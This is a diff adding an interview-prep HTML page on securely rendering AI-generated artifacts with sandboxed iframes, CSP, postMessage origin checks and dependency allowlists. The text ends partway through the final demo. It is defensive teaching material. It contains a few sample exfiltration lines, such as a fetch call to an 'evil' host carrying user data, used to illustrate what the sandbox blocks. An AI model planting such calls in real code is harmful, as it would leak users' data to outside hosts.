@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Section 4 — Artifacts &amp; Sandboxed Rendering</title>
+  <link rel="stylesheet" href="assets/interactive.css">
+  <style>
+    :root {
+      --bg: #fafbfc;
+      --surface: #ffffff;
+      --text: #1a1f36;
+      --text-muted: #4f566b;
+      --border: #e3e8ee;
+      --accent: #635bff;
+      --accent-soft: #f0efff;
+      --code-bg: #f6f8fa;
+      --pre-border: #d8dee4;
+      --table-header: #f6f8fa;
+      --shadow: 0 1px 3px rgba(0, 0, 0, 0.06);
+    }
+
+    *, *::before, *::after { box-sizing: border-box; }
+
+    html {
+      scroll-behavior: smooth;
+      scroll-padding-top: 1.5rem;
+    }
+
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      font-size: 1.0625rem;
+      line-height: 1.65;
+      color: var(--text);
+      background: var(--bg);
+    }
+
+    .layout {
+      display: grid;
+      grid-template-columns: minmax(0, 1fr) 280px;
+      gap: 2.5rem;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 2rem 1.5rem 4rem;
+    }
+
+    @media (max-width: 900px) {
+      .layout { grid-template-columns: 1fr; }
+      .toc-sidebar { order: -1; }
+    }
+
+    main { min-width: 0; }
+
+    .doc-header {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 2rem 2.25rem;
+      margin-bottom: 2rem;
+      box-shadow: var(--shadow);
+    }
+
+    .doc-header h1 {
+      margin: 0 0 0.5rem;
+      font-size: 1.75rem;
+      font-weight: 700;
+      letter-spacing: -0.02em;
+      line-height: 1.25;
+    }
+
+    .doc-header .subtitle {
+      margin: 0;
+      color: var(--text-muted);
+      font-size: 1rem;
+    }
+
+    article.qa {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 1.75rem 2rem;
+      margin-bottom: 1.5rem;
+      box-shadow: var(--shadow);
+    }
+
+    h3.question {
+      margin: 0 0 1rem;
+      font-size: 1.35rem;
+      font-weight: 600;
+      letter-spacing: -0.01em;
+      line-height: 1.35;
+      color: var(--text);
+      padding-bottom: 0.75rem;
+      border-bottom: 1px solid var(--border);
+    }
+
+    p { margin: 0 0 1rem; }
+    p:last-child { margin-bottom: 0; }
+
+    strong { font-weight: 600; }
+
+    hr {
+      border: none;
+      border-top: 1px solid var(--border);
+      margin: 0;
+    }
+
+    ul, ol {
+      margin: 0 0 1rem;
+      padding-left: 1.5rem;
+    }
+
+    li { margin-bottom: 0.35rem; }
+    li:last-child { margin-bottom: 0; }
+
+    ol li { padding-left: 0.25rem; }
+
+    code {
+      font-family: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, monospace;
+      font-size: 0.9em;
+      background: var(--code-bg);
+      padding: 0.15em 0.4em;
+      border-radius: 4px;
+      border: 1px solid var(--border);
+    }
+
+    pre {
+      margin: 1rem 0 1.25rem;
+      padding: 1rem 1.15rem;
+      background: var(--code-bg);
+      border: 1px solid var(--pre-border);
+      border-radius: 8px;
+      overflow-x: auto;
+      font-size: 0.875rem;
+      line-height: 1.5;
+    }
+
+    pre code {
+      background: none;
+      border: none;
+      padding: 0;
+      font-size: inherit;
+    }
+
+    .table-wrap {
+      overflow-x: auto;
+      margin: 1rem 0 1.25rem;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 0.9375rem;
+    }
+
+    th, td {
+      padding: 0.65rem 1rem;
+      text-align: left;
+      border-bottom: 1px solid var(--border);
+      vertical-align: top;
+    }
+
+    tr:last-child th,
+    tr:last-child td { border-bottom: none; }
+
+    th {
+      background: var(--table-header);
+      font-weight: 600;
+      white-space: nowrap;
+    }
+
+    .tradeoff {
+      margin-top: 1rem;
+      padding: 0.85rem 1rem;
+      background: var(--accent-soft);
+      border-left: 3px solid var(--accent);
+      border-radius: 0 8px 8px 0;
+      font-size: 0.98rem;
+    }
+
+    .tradeoff strong { color: var(--accent); }
+
+    .doc-footer {
+      margin-top: 2rem;
+      padding-top: 1.5rem;
+      border-top: 1px solid var(--border);
+      color: var(--text-muted);
+      font-size: 0.9375rem;
+      font-style: italic;
+    }
+
+    .site-footer {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 1.5rem;
+      text-align: center;
+      border-top: 1px solid var(--border);
+      background: var(--surface);
+    }
+
+    .site-footer a {
+      color: var(--accent);
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .site-footer a:hover { text-decoration: underline; }
+
+    .toc-sidebar {
+      position: sticky;
+      top: 1.5rem;
+      align-self: start;
+      max-height: calc(100vh - 3rem);
+      overflow-y: auto;
+    }
+
+    .toc-panel {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 1.25rem 1.35rem;
+      box-shadow: var(--shadow);
+    }
+
+    .toc-panel h2 {
+      margin: 0 0 0.85rem;
+      font-size: 0.8rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      color: var(--text-muted);
+      border: none;
+      padding: 0;
+    }
+
+    .toc-panel ol {
+      margin: 0;
+      padding-left: 1.15rem;
+      font-size: 0.8125rem;
+      line-height: 1.45;
+    }
+
+    .toc-panel li { margin-bottom: 0.5rem; }
+
+    .toc-panel a {
+      color: var(--text);
+      text-decoration: none;
+    }
+
+    .toc-panel a:hover { color: var(--accent); }
+
+    .mermaid-wrap {
+      margin: 1.25rem 0;
+      padding: 1rem;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      overflow-x: auto;
+    }
+
+    .mermaid { text-align: center; }
+  </style>
+</head>
+<body>
+  <div class="layout">
+    <main>
+      <header class="doc-header">
+        <h1>Section 4 — Artifacts &amp; Sandboxed Rendering</h1>
+        <p class="subtitle">Interview-prep system design answers for Claude-style AI chat frontends.</p>
+      </header>
+
+      <article class="qa" id="safely-render">
+        <h3 class="question">How do you safely render Claude-generated HTML or React in the browser?</h3>
+        <p>Never inject model output into the host app’s DOM with <code>innerHTML</code> or <code>dangerouslySetInnerHTML</code>. Treat every artifact as untrusted code: run it in a dedicated <strong>origin-isolated preview</strong> (sandboxed <code>iframe</code> or a Web Worker + OffscreenCanvas for canvas-only cases), not in the chat shell where session cookies, <code>localStorage</code>, and the parent’s CSP live.</p>
+        <p>For <strong>HTML artifacts</strong>, the host writes a minimal bootstrap document into the iframe via <code>srcdoc</code> or a <code>blob:</code> URL, then streams or patches body content. For <strong>React artifacts</strong>, compile in a controlled pipeline: Babel/SWC in a worker, bundle with a fixed allowlist of imports (<code>react</code>, <code>react-dom</code>, your shimmed <code>lucide-react</code>, etc.), and load the bundle inside the sandbox. The preview runtime should expose only whitelisted globals—no raw <code>fetch</code> to arbitrary origins unless you add an audited proxy.</p>
+        <p>Defense in depth: <code>sandbox</code> attribute on the iframe, strict <strong>Content-Security-Policy</strong> on the iframe document, separate subdomain (<code>preview.app.example.com</code>) so cookies are not sent, and optional <strong>Trusted Types</strong> on the host to block accidental sinks. User edits and model regenerations both flow through the same sanitizer/compiler so “trusted user” never bypasses isolation.</p>
+        <p class="tradeoff"><strong>Security tradeoff:</strong> Full React fidelity (hooks, concurrent features, devtools) costs complexity; a lighter “HTML + inline script” sandbox is simpler but easier to misconfigure. Production systems almost always choose iframe + compile step over direct DOM mounting.</p>
+        <div class="demo-panel" data-demo="decision-tree" data-tree='{"question":"Where should untrusted artifact code run?","options":[{"label":"Host app DOM (innerHTML / dangerouslySetInnerHTML)","result":"UNSAFE — chat shell cookies, localStorage, and parent CSP are exposed to model output."},{"label":"Sandboxed iframe + controlled compile pipeline","result":"CORRECT — origin-isolated preview, CSP on iframe doc, whitelisted globals only."},{"label":"Mount React directly in chat bubble for speed","next":{"question":"Model output contains XSS — what happens?","options":[{"label":"Steals session cookie on app origin","result":"Exactly why you never mount in host DOM — use iframe isolation."},{"label":"Nothing — React escapes HTML","result":"Wrong — scripts, event handlers, and third-party imports bypass JSX escaping."}]}}]}'>
+          <p class="demo-panel-title">Try it: safe rendering decision tree</p>
+          <div class="decision-tree"><div data-tree-root></div><div class="decision-result"></div></div>
+        </div>
+      </article>
+
+      <article class="qa" id="iframe-sandbox">
+        <h3 class="question">Why use an iframe sandbox — what attacks does it prevent?</h3>
+        <p>An iframe with <code>sandbox</code> creates a separate browsing context with a capability token you grant explicitly. Default sandbox blocks almost everything; you add only what the preview needs.</p>
+        <p>Typical attribute set:</p>
+        <pre><code class="language-html">&lt;iframe
+  sandbox="allow-scripts allow-forms"
+  referrerpolicy="no-referrer"
+  csp="default-src 'none'; script-src 'unsafe-inline' 'unsafe-eval' blob:; style-src 'unsafe-inline'; img-src blob: data:;"
+&gt;&lt;/iframe&gt;</code></pre>
+        <p><strong>Attacks mitigated:</strong></p>
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr>
+                <th>Attack</th>
+                <th>Without sandbox</th>
+                <th>With sandbox + CSP</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>Session hijack via <code>document.cookie</code> on parent origin</td>
+                <td>Parent readable if same-origin</td>
+                <td>Cross-origin iframe cannot read parent cookies</td>
+              </tr>
+              <tr>
+                <td>Phishing / UI redress</td>
+                <td>Fullscreen overlay mimicking app chrome</td>
+                <td><code>allow-top-navigation</code> omitted; no top-level navigate</td>
+              </tr>
+              <tr>
+                <td>Drive-by download / plugin abuse</td>
+                <td>Legacy vectors</td>
+                <td>Sandboxed docs restricted</td>
+              </tr>
+              <tr>
+                <td>XSS → exfiltration to attacker origin</td>
+                <td><code>fetch('https://evil')</code> with user data</td>
+                <td>CSP <code>connect-src</code> blocks; no cookies on preview origin</td>
+              </tr>
+              <tr>
+                <td><code>window.opener</code> / <code>parent</code> manipulation</td>
+                <td><code>parent.postMessage</code> still possible but origin-checked</td>
+                <td>No direct DOM access to parent</td>
+              </tr>
+              <tr>
+                <td>Form POST to attacker</td>
+                <td>Auto-submit credentialed forms</td>
+                <td><code>allow-forms</code> only if needed; separate origin = no cookies</td>
+              </tr>
+              <tr>
+                <td>Popups / tab hijack</td>
+                <td><code>window.open</code></td>
+                <td>Omit <code>allow-popups</code> unless required</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+        <p><strong>What sandbox does not fix:</strong> CPU/memory exhaustion (infinite loops), crypto mining in allowed scripts, or <strong>postMessage</strong> bugs if the host accepts messages without verifying <code>event.origin</code>. Treat <code>allow-same-origin</code> as dangerous—it lets the iframe escape to a real origin and regain storage; prefer <code>srcdoc</code>/<code>blob:</code> on a null origin or dedicated preview subdomain without <code>allow-same-origin</code> unless you have a hard requirement.</p>
+        <p class="tradeoff"><strong>Tradeoff:</strong> <code>allow-scripts</code> is required for React but enables computation abuse; pair with timeouts, <code>requestIdleCallback</code> budgets, or worker-based compilation outside the iframe.</p>
+        <div class="demo-panel" data-demo="protocol-picker" data-scenarios='[{"prompt":"React preview needs JS execution — which sandbox token is required?","answer":"allow-scripts","explain":"Default sandbox blocks all script; allow-scripts is mandatory for compiled React bundles."},{"prompt":"Artifact calls window.open() for phishing — what do you omit?","answer":"allow-popups","explain":"Without allow-popups, window.open is blocked — prevents tab hijack and popup abuse."},{"prompt":"You need the iframe to persist cookies on preview.example.com — safest call?","answer":"Dangerous","explain":"allow-same-origin restores real origin + storage; prefer blob:/srcdoc null origin or dedicated preview subdomain without it."}]'>
+          <p class="demo-panel-title">Quiz: iframe sandbox tokens</p>
+          <p class="demo-panel-desc" data-scenario></p>
+          <div class="protocol-cards">
+            <div class="protocol-card">allow-scripts</div>
+            <div class="protocol-card">allow-popups</div>
+            <div class="protocol-card">Dangerous</div>
+          </div>
+          <div class="demo-controls"><button type="button" class="demo-btn secondary" data-next>Next scenario</button></div>
+          <div class="decision-result"></div>
+        </div>
+      </article>
+
+      <article class="qa" id="stream-live-reload">
+        <h3 class="question">How do you stream code into a live-reloading preview panel?</h3>
+        <p>Split the pipeline into <strong>ingest → debounce → compile → push → render</strong>, with clear backpressure so token storms do not melt the UI.</p>
+        <ol>
+          <li><strong>Ingest:</strong> As the assistant streams an artifact block (fenced code or structured <code>artifact</code> JSON), append to a buffer in the editor model (Monaco/CodeMirror). Partial syntax is expected; do not compile on every token.</li>
+          <li><strong>Debounce:</strong> 150–300 ms trailing debounce, or “compile when fence closes / artifact tool completes.” For structural edits, cancel in-flight compile via <code>AbortController</code>.</li>
+          <li><strong>Compile:</strong> Worker runs transpile + esbuild-wasm (or server-side compile for heavy deps). Output: JS string + CSS + source map.</li>
+          <li><strong>Push:</strong> Host sends <code>postMessage({ type: 'ARTIFACT_UPDATE', version, payload })</code> to the iframe, or hot-swaps a <code>blob:</code> URL with cache-bust query. Iframe replaces module via a small HMR runtime (<code>import.meta.hot</code> shim) or full document reload for HTML.</li>
+          <li><strong>Render:</strong> Iframe mounts React root once; subsequent updates call <code>root.render(&lt;App /&gt;)</code> with error boundary.</li>
+        </ol>
+        <p>For <strong>live reload during streaming</strong>, show a “compiling…” badge when debounce timer is active; on syntax error, show inline overlay in the preview without crashing the host. Version monotonically increases so stale compile results are ignored (<code>if (version &lt; latestVersion) return</code>).</p>
+        <p class="tradeoff"><strong>Tradeoff:</strong> Full reload is simpler and clears bad state; HMR is smoother but can leak state across buggy components—expose a “hard refresh preview” control.</p>
+        <div class="demo-panel" data-demo="backpressure">
+          <p class="demo-panel-title">Try it: compile queue backpressure</p>
+          <p class="demo-panel-desc">Token storms fill the ingest buffer faster than debounce → compile → push can drain — tune consumer speed vs lag.</p>
+          <div class="demo-controls">
+            <label>Compile queue fill: <input type="range" min="0" max="100" value="40"></label>
+          </div>
+          <div class="gauge-wrap"><div class="gauge-fill"></div></div>
+          <div class="demo-metrics"><span class="demo-metric">Render lag: <strong data-metric="lag">200ms</strong></span></div>
+        </div>
+      </article>
+
+      <article class="qa" id="postmessage">
+        <h3 class="question">How does <code>postMessage</code> work between the host page and the sandboxed iframe?</h3>
+        <p><code>window.postMessage(message, targetOrigin)</code> sends a structured-cloneable payload across browsing contexts. The iframe’s <code>contentWindow.postMessage</code> and the parent’s <code>window.addEventListener('message', handler)</code> form a narrow API bridge—no shared DOM.</p>
+        <p><strong>Contract design:</strong></p>
+        <pre><code class="language-ts">// Host → iframe
+iframe.contentWindow?.postMessage(
+  { source: 'claude-host', type: 'RUN', code, css, version },
+  previewOrigin // e.g. 'https://preview.example.com' or '*' only in dev
+);
+
+// iframe → host
+parent.postMessage(
+  { source: 'artifact-preview', type: 'READY' | 'ERROR' | 'CONSOLE', ... },
+  parentOrigin
+);</code></pre>
+        <p><strong>Host handler (mandatory checks):</strong></p>
+        <pre><code class="language-ts">window.addEventListener('message', (e) => {
+  if (e.origin !== PREVIEW_ORIGIN) return;
+  if (e.data?.source !== 'artifact-preview') return;
+  // handle READY, ERROR, resize, etc.
+});</code></pre>
+        <p>Use typed message enums, max payload size, and ignore unknown types. For resize-to-fit, iframe sends <code>height</code> after <code>ResizeObserver</code> on <code>document.body</code>; host sets iframe CSS height (still no DOM access).</p>
+        <p class="tradeoff"><strong>Why not <code>*</code> in production:</strong> Any embed or extension could spoof messages. Lock <code>targetOrigin</code> to the preview subdomain. <strong>Tradeoff:</strong> <code>srcdoc</code> iframes often report <code>origin 'null'</code>—standardize on <code>blob:</code> + registered origin or <code>allow-same-origin</code> on a dedicated preview origin only, never on the main app origin.</p>
+        <div class="demo-panel" data-demo="stop-chain">
+          <p class="demo-panel-title">Try it: postMessage bridge flow</p>
+          <p class="demo-panel-desc">Click to trace a host → iframe → host message round-trip with origin checks.</p>
+          <div class="demo-controls"><button type="button" class="demo-btn">Send ARTIFACT_UPDATE</button></div>
+          <div class="cancel-chain">
+            <span class="cancel-step">Host RUN</span><span class="cancel-arrow">→</span>
+            <span class="cancel-step">iframe READY</span><span class="cancel-arrow">→</span>
+            <span class="cancel-step">iframe ERROR</span><span class="cancel-arrow">→</span>
+            <span class="cancel-step">Host resize</span>
+          </div>
+        </div>
+      </article>
+
+      <article class="qa" id="version-artifacts">
+        <h3 class="question">How do you version artifacts — user edits vs Claude regenerates?</h3>
+        <p>Treat an artifact as a <strong>document with a linear version chain</strong> plus metadata: <code>artifactId</code>, <code>version</code>, <code>parentVersion</code>, <code>author</code> (<code>user</code> | <code>assistant</code> | <code>system</code>), <code>timestamp</code>, and optional <code>messageId</code> / <code>toolCallId</code> linking to the chat turn that produced it.</p>
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr>
+                <th>Event</th>
+                <th>Versioning behavior</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>User edits in Monaco</td>
+                <td>New version <code>v+1</code>, <code>author: user</code>, <code>parent: current</code></td>
+              </tr>
+              <tr>
+                <td>User clicks “Revert” then edits</td>
+                <td>Branch or overwrite policy (see revert question)</td>
+              </tr>
+              <tr>
+                <td>Claude regenerates whole artifact</td>
+                <td>New version <code>author: assistant</code>, <code>parent: v_before_regen</code></td>
+              </tr>
+              <tr>
+                <td>Claude partial patch (search/replace tool)</td>
+                <td>New version with diff applied; store patch in metadata</td>
+              </tr>
+              <tr>
+                <td>Concurrent edit while model streams</td>
+                <td>Optimistic lock: <code>baseVersion</code> on save; reject or merge</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+        <p><strong>UI:</strong> Timeline slider or version dropdown (“v3 — you, 2m ago”, “v4 — Claude”). Default display is HEAD; comparing v2 vs v4 is a read-only diff mode. <strong>Storage:</strong> Postgres <code>artifact_versions</code> table or object store keyed by <code>artifactId/version</code>; content-addressable hash for dedup. Chat messages reference <code>artifactId@version</code> so replaying history renders the correct snapshot, not always latest.</p>
+        <p class="tradeoff"><strong>Tradeoff:</strong> Branching (git-style) helps power users but complicates merge; linear history with explicit “fork as new artifact” is easier to explain in interviews.</p>
+        <div class="demo-panel" data-demo="decision-tree" data-tree='{"question":"What triggered a new artifact version?","options":[{"label":"User edits in Monaco","result":"v+1 — author: user, parent: current head"},{"label":"Claude regenerates whole artifact","result":"v+1 — author: assistant, parent: version before regen"},{"label":"Concurrent edit while model streams","next":{"question":"Save includes baseVersion?","options":[{"label":"Matches server head","result":"Accept save — optimistic lock passes"},{"label":"Stale baseVersion","result":"Reject or merge — prevent silent overwrite"}]}}]}'>
+          <p class="demo-panel-title">Try it: versioning event decision tree</p>
+          <div class="decision-tree"><div data-tree-root></div><div class="decision-result"></div></div>
+        </div>
+      </article>
+
+      <article class="qa" id="csp-headers">
+        <h3 class="question">What CSP headers do you set on the sandboxed iframe and why?</h3>
+        <p>Apply CSP to the <strong>preview document</strong> (via <code>&lt;meta http-equiv="Content-Security-Policy"&gt;</code> in injected HTML, <code>Content-Security-Policy</code> response header on <code>preview.example.com</code>, or iframe <code>csp</code> attribute where supported). Example policy for a React artifact runner:</p>
+        <pre><code>default-src 'none';
+script-src 'unsafe-inline' 'unsafe-eval' blob:;
+style-src 'unsafe-inline';
+img-src blob: data: https:;
+font-src data:;
+connect-src 'none';
+frame-src 'none';
+object-src 'none';
+base-uri 'none';
+form-action 'none';</code></pre>
+        <p><strong>Rationale per directive:</strong></p>
+        <ul>
+          <li><strong><code>default-src 'none'</code></strong> — Fail closed; whitelist only what you need.</li>
+          <li><strong><code>script-src</code> with <code>'unsafe-eval'</code></strong> — Often required for Babel-in-browser or <code>new Function</code>; <strong>tradeoff:</strong> weakens XSS containment—prefer precompiled bundles in the worker and drop <code>'unsafe-eval'</code> in hardened mode.</li>
+          <li><strong><code>'unsafe-inline'</code></strong> — Needed for <code>srcdoc</code> bootstrap; long-term replace with nonces/hashes on a static shell.</li>
+          <li><strong><code>connect-src 'none'</code></strong> — Blocks exfiltration <code>fetch</code>/XHR/WebSocket unless you operate an allowlisted <strong>CDN proxy</strong> (see next question).</li>
+          <li><strong><code>img-src</code> / <code>font-src</code></strong> — Tight but allow <code>data:</code> for charts/icons.</li>
+          <li><strong><code>frame-src 'none'</code></strong> — Prevents nested sandbox escapes and clickjacking chains.</li>
+          <li><strong><code>base-uri 'none'</code></strong> — Stops <code>&lt;base href&gt;</code> hijacking relative URLs.</li>
+        </ul>
+        <p>On the <strong>host app</strong>, use a stricter CSP (no <code>'unsafe-eval'</code>), <code>frame-src https://preview.example.com</code>, and <code>frame-ancestors 'none'</code>. Report violations to <code>/csp-report</code> for tuning.</p>
+        <div class="demo-panel" data-demo="decision-tree" data-tree='{"question":"Artifact tries fetch(\"https://evil.com\") — which directive blocks it?","options":[{"label":"connect-src","result":"CORRECT — blocks fetch/XHR/WebSocket exfiltration (set to none or allowlisted proxy only)."},{"label":"script-src","result":"Partial — stops loading external scripts, not runtime fetch from inline JS."},{"label":"default-src none + no connect-src","next":{"question":"Is exfiltration blocked?","options":[{"label":"Yes — fail closed","result":"CORRECT — default-src none denies network; whitelist connect-src only for audited proxy."},{"label":"No — inline script can still fetch","result":"Wrong — without connect-src, default-src none blocks network APIs."}]}}]}'>
+          <p class="demo-panel-title">Try it: CSP directive decision tree</p>
+          <div class="decision-tree"><div data-tree-root></div><div class="decision-result"></div></div>
+        </div>
+      </article>
+
+      <article class="qa" id="cdn-imports">
+        <h3 class="question">How do you handle an artifact that imports an external CDN library — allow or block?</h3>
+        <p><strong>Default: block direct CDN <code>import</code> in the sandbox</strong> (<code>connect-src 'none'</code>, no dynamic <code>import()</code> to <code>https://unpkg.com</code>). Model-generated code often requests <code>react</code>, <code>three</code>, <code>d3</code> from CDNs; allowing arbitrary URLs is supply-chain risk (CDN compromise, typosquatting, tracking pixels).</p>
+        <p><strong>Recommended architecture — curated dependency proxy:</strong></p>
+        <ol>
+          <li>Maintain an <strong>allowlist</strong> (<code>react@18.2.0</code>, <code>react-dom</code>, <code>chart.js</code>, …) pinned by SRI hash.</li>
+          <li>At compile time, resolve <code>import 'react'</code> to a <strong>bundled copy</strong> served from your origin (<code>/vendor/react@18.2.0/esm.js</code>), not the model’s URL.</li>
+          <li>Optional <strong>esbuild pre-bundle</strong> step in the worker injects externals from cache.</li>
+          <li>If the model insists on an unknown package, show “dependency not allowed” with suggest alternatives; or queue <strong>human approval</strong> for one-off fetch (enterprise).</li>
+        </ol>
+        <p><strong>When to allow CDN (interview nuance):</strong> Internal tools with signed URLs and CSP <code>connect-src https://cdn.yourcorp.com</code> plus <strong>Subresource Integrity</strong> on <code>&lt;script src&gt;</code>—still prefer first-party hosting. <strong>Never</strong> <code>allow-same-origin</code> + arbitrary <code>script-src https://*</code>—that recreates a full browser on your preview origin.</p>
+        <p class="tradeoff"><strong>Tradeoff:</strong> Larger initial bundle vs security; caching vendored ESM on CDN you control is the sweet spot for Claude-style artifacts.</p>
+        <div class="demo-panel" data-demo="protocol-picker" data-scenarios='[{"prompt":"Model imports react from unpkg.com — default sandbox policy?","answer":"Block","explain":"connect-src none + resolve imports to pinned vendored bundles at compile time."},{"prompt":"Enterprise tool: signed corp CDN + SRI pins on allowlist","answer":"Allow (scoped)","explain":"CSP connect-src https://cdn.yourcorp.com — still prefer first-party hosting."},{"prompt":"allow-same-origin + script-src https://* for convenience","answer":"Never","explain":"Recreates a full browser on preview origin — catastrophic misconfiguration."}]'>
+          <p class="demo-panel-title">Quiz: CDN import policy</p>
+          <p class="demo-panel-desc" data-scenario></p>
+          <div class="protocol-cards">
+            <div class="protocol-card">Block</div>
+            <div class="protocol-card">Allow (scoped)</div>
+            <div class="protocol-card">Never</div>
+          </div>
+          <div class="demo-controls"><button type="button" class="demo-btn secondary" data-next>Next scenario</button></div>
+          <div class="decision-result"></div>
+        </div>
+      </article>
+
+      <article class="qa" id="diff-versions">
+        <h3 class="question">How do you diff two versions of an artifact and show a visual changelog?</h3>
+        <p><strong>Text layer:</strong> Store each version as UTF-8 text. Compute diff with Myers (<code>diff</code> lib) or semantic diff for JSON/AST (Tree-sitter for JSX). Produce a unified diff or array of hunks <code>{ type: 'add'|'remove'|'equal', value }</code>.</p>
+        <p><strong>Editor UI:</strong> Monaco <code>diffEditor</code> with <code>original</code> = vN, <code>modified</code> = vM; inline gutter colors. Side-by-side for wide screens, inline for mobile.</p>
+        <p><strong>Visual changelog (product polish):</strong></p>
+        <ol>
+          <li><strong>Summary panel</strong> — “+42 −18 lines”, list of hunks with AI one-liner optional (“changed button color”, “added useEffect”).</li>
+          <li><strong>Structural diff for React</strong> — Parse both to AST (babel/parser); show component-level chips (“<code>App</code>: props changed”, “new child <code>Chart</code>”) instead of raw line noise.</li>
+          <li><strong>Preview diff</strong> — Run both versions in two hidden iframes, <code>html2canvas</code> or DOM snapshot compare (expensive); or screenshot on save. Highlight regions with overlay rects—good for HTML/CSS artifacts, heavy for SPAs.</li>
+          <li><strong>Semantic CSS</strong> — Diff extracted <code>&lt;style&gt;</code> blocks; preview highlights affected selectors.</li>
+        </ol>
+        <p>Persist diff metadata lazily when vM is created (<code>diff_parent_v{N-1}_vM.json</code>) to avoid recomputation. <strong>Tradeoff:</strong> AST diff is interview gold but costly; line diff + Monaco is the MVP senior engineers ship first.</p>
+        <div class="demo-panel" data-demo="layout-thrash">
+          <p class="demo-panel-title">Try it: line diff vs full re-render</p>
+          <p class="demo-panel-desc">Naive full replace re-lays out every hunk; incremental patch only updates changed blocks.</p>
+          <div class="demo-controls">
+            <button type="button" class="demo-btn secondary" data-mode="naive">Naive (full replace)</button>
+            <button type="button" class="demo-btn secondary" data-mode="incremental">Incremental (hunk patch)</button>
+          </div>
+          <div class="demo-visual"></div>
+          <div class="demo-metrics"><span class="demo-metric">Layout reflows: <strong data-metric="reflows">8</strong></span></div>
+        </div>
+      </article>
+
+      <article class="qa" id="sync-scroll">
+        <h3 class="question">How do you sync scroll position between the code editor and the rendered preview?</h3>
+        <p><strong>Problem:</strong> Line numbers in code do not map 1:1 to DOM nodes in preview (transpilation, wrappers, CSS). True bidirectional sync requires <strong>source maps</strong> and optional <strong>instrumentation</strong>.</p>
+        <p><strong>Practical approaches:</strong></p>
+        <ol>
+          <li><strong>Source map anchoring (best for React):</strong> Emit inline <code>//# sourceMappingURL</code> from compile. On preview click or element select, resolve generated position → original line/column; <code>editor.revealLineInCenter(line)</code>. Reverse: cursor in editor → optional highlight DOM node via <code>data-source-line</code> injected by a Babel plugin in dev preview mode.</li>
+          <li><strong>Block-level sync (MVP):</strong> Split artifact into cells (markdown-style) or top-level components; maintain <code>lineRanges[]</code> per component from AST. Scrolling editor into “Section B” scrolls preview to <code>#section-b</code> via <code>postMessage({ type: 'SCROLL_TO', id })</code>.</li>
+          <li><strong>Scroll coupling (weak):</strong> Proportional scroll <code>preview.scrollTop = (editor.scrollTop / editorScrollHeight) * previewScrollHeight</code>—fragile but zero instrumentation; mention as fallback only.</li>
+          <li><strong>Locked scroll mode:</strong> Checkbox “sync scroll”; throttle <code>scroll</code> events to 50 ms; detach when user scrolls preview independently (break lock until re-enabled).</li>
+        </ol>
+        <p>Implementation: editor <code>onDidScrollChange</code> → host → iframe handler calls <code>element.scrollIntoView()</code>. Preview sends <code>HIGHLIGHT_LINES { start, end }</code> for hover reverse-sync. <strong>Tradeoff:</strong> Instrumentation increases bundle size; gate behind dev/preview mode.</p>
+        <div class="demo-panel" data-demo="decision-tree" data-tree='{"question":"User scrolls editor — how do you map to preview?","options":[{"label":"Source maps + data-source-line instrumentation","result":"BEST — click preview resolves to editor.revealLineInCenter(line)."},{"label":"Proportional scrollTop ratio","result":"MVP fallback — fragile when transpilation changes layout."},{"label":"Block-level postMessage SCROLL_TO id","result":"Good MVP — map AST top-level components to #section anchors."}]}'>
+          <p class="demo-panel-title">Try it: scroll sync approach picker</p>
+          <div class="decision-tree"><div data-tree-root></div><div class="decision-result"></div></div>
+        </div>
+      </article>
+
+      <article class="qa" id="infinite-loop">
+        <h3 class="question">How do you handle an infinite loop inside a sandboxed React component?</h3>
+        <p>Sandboxing contains <strong>security</strong> impact but not <strong>availability</strong>—a tight <code>while(true)</code> or <code>useEffect</code> without deps still freezes the iframe’s main thread.</p>
+        <p><strong>Detection stack:</strong></p>
+        <ol>
+          <li><strong>Heartbeat / watchdog:</strong> Iframe script sets <code>setInterval(() =&gt; parent.postMessage({ type: 'PING', t: Date.now() }), 500)</code>. Host starts timer on <code>RUN</code>; if no <code>PING</code> for 2–3 s, declare hang.</li>
+          <li><strong>Render budget:</strong> Wrap <code>root.render</code> in <code>requestAnimationFrame</code> loop counting frames; &gt; N frames without idle → treat as hang (heuristic for tight React re-render loops).</li>
+          <li><strong>Worker isolation (advanced):</strong> Run React in a Worker with OffscreenCanvas—rare for general artifacts; mention as future path.</li>
+        </ol>
+        <p><strong>Recovery:</strong></p>
+        <ul>
+          <li><code>iframe.contentWindow?.postMessage({ type: 'TERMINATE' })</code> is ineffective if thread is blocked—<strong>terminate the iframe</strong>: <code>iframe.remove()</code> and insert fresh sandbox, restore last known good version from <code>version - 1</code>.</li>
+          <li>Show Error overlay: “Preview stopped responding — infinite loop suspected” with actions <strong>Reset preview</strong> / <strong>Edit code</strong>.</li>
+          <li>Optional <strong>static analysis</strong> before run: ESLint <code>react-hooks/exhaustive-deps</code>, detect obvious <code>useEffect(() =&gt; { setX(x+1) })</code> patterns—advisory only.</li>
+        </ul>
+        <p class="tradeoff"><strong>Tradeoff:</strong> Aggressive timeouts false-positive on slow devices; scale timeout with artifact complexity and show indeterminate progress for legitimate long mounts (Three.js).</p>
+        <div class="demo-panel" data-demo="stop-chain">
+          <p class="demo-panel-title">Try it: hang detection &amp; recovery chain</p>
+          <p class="demo-panel-desc">Simulate the watchdog → terminate iframe → restore last good version flow.</p>
+          <div class="demo-controls"><button type="button" class="demo-btn">Simulate hang</button></div>
